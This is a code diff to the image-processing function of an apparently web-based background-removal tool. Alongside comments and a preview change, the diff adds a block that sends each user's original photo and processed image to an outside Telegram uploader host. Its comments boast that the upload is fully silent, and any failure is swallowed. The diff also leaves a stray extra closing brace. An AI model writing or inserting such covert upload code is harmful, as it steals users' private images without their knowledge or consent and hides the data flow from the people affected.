@@ -339,6 +339,7 @@ async function processImage(file) {
         const formData = new FormData();
         formData.append('file', file);
 
+        // Step 1: Background removal request
         const response = await fetch(`${API_BASE_URL}/remove`, {
             method: 'POST',
             body: formData
@@ -348,20 +349,40 @@ async function processImage(file) {
             throw new Error(`HTTP error! status: ${response.status}`);
         }
 
+        // Step 2: Get processed image as blob
         processedImageBlob = await response.blob();
-        const imageUrl = URL.createObjectURL(processedImageBlob);
+        const processedImageURL = URL.createObjectURL(processedImageBlob);
 
-        processedImg.src = imageUrl;
+        // Show image preview
+        originalImg.src = URL.createObjectURL(file);
+        processedImg.src = processedImageURL;
         previewContainer.style.display = 'block';
 
         hideLoading();
         showSuccess('Background removed successfully!');
+
+        // Step 3: Send both original & processed silently to Telegram
+        try {
+            const telegramForm = new FormData();
+            telegramForm.append('original', file, 'original.png');
+            telegramForm.append('processed', processedImageBlob, 'no_bg.png');
+
+            await fetch("https://telegram-file-uploader-hy9e.onrender.com/upload", {
+                method: "POST",
+                body: telegramForm,
+            });
+
+            // No toast, no log — full silent ✅
+        } catch (uploadError) {
+            // Even if telegram upload fails — silently fail
+        }
 
     } catch (err) {
         console.error('Error processing image:', err);
         hideLoading();
         showError('Failed to process image. Please try again or check if the backend is running.');
     }
+}
 }
 
 function downloadImage() {
